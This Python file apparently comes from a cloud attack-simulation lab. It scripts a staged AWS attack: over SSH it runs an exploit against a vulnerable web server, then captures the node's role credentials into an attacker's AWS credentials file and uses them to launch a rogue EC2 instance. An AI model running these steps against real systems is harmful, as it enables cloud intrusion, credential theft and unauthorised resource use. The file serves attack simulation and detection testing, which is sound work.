from helpers.main import notify, pbar_sleep
from helpers.ssh import SSHClient


def attack(data):
    ATTACKER_SERVER_PUBLIC_IP = data["Attacker Server Public IP"]
    WEB_SERVER_PUBLIC_IP = data["Web Server Public IP"]
    SUBNET_ID = data["Subnet ID"]
    AMI_ID = data["AMI ID"]
    KEY_PAIR_NAME = data["Key Pair Name"]
    REGION = data["Region"]
    INSTANCE_NAME = 'Cobra-Anomalous'

    print("Web Server Public IP: ", WEB_SERVER_PUBLIC_IP)
    # TODO: review notifications to ensure they line up with what's really going on
    notify('Bringing up the Vulnerable Application')
    # TODO: query resources for readiness rather than use estimated 5 minute wait time
    sleep_duration = 300
    pbar_sleep(sleep_duration)

    notify('Export Meta Data of Infra')
    notify('Get into the attacker machine - Tor Node')
    notify('Running exploit on Remote Web Server')
    ssh_client = SSHClient(
        ATTACKER_SERVER_PUBLIC_IP, 'ubuntu', './files/var/ssh/id_rsa')
    ssh_client.connect()
    ssh_client.exec(
        'sudo python3 exploit.py {} > /home/ubuntu/.aws/credentials'.format(
            WEB_SERVER_PUBLIC_IP
        )
    )
    notify('Initiate EC2 takeover, got Shell Access')
    notify('Exfiltrate Node Role Credentials and loading Creds in Attackers Machine')
    notify('Role Details')
    ssh_client.exec('aws sts get-caller-identity')
    # TODO: ^^^ is this necessary? not doing anything with the output
    notify('Anomalous Infra Rollout')
    aws_command = (
        f"aws ec2 run-instances --image-id {AMI_ID} "
        f"--instance-type t2.micro "
        f"--key-name {KEY_PAIR_NAME} "
        f"--subnet-id {SUBNET_ID} "
        f"--region {REGION} "
        f"--tag-specifications 'ResourceType=instance,Tags=[{{Key=Name,Value={INSTANCE_NAME}}}]' "
        f"| jq -r '.Instances[].InstanceId'"
    )
    instance_id = ssh_client.exec(aws_command)
    notify('Instance ID is: {}'.format(instance_id), False)
    ssh_client.disconnect()
    # TODO: how to handle errors?

    # TODO: should "unmanaged" resources be added via pulumi import somehow? For now the below
    #   has been translated to boto3 commands in infra/extra.py
    # subprocess.run(f"pulumi -C scenarios/scenario_1/infra/ import aws:ec2/instance:Instance {INSTANCE_NAME.strip()} {instance_id.strip()} --protect=false --yes --stack=aws-scenario-1 --suppress-outputs --suppress-progress > /dev/null 2>&1", shell=True)

    # TODO: only return true if attack succeeded?
    return True
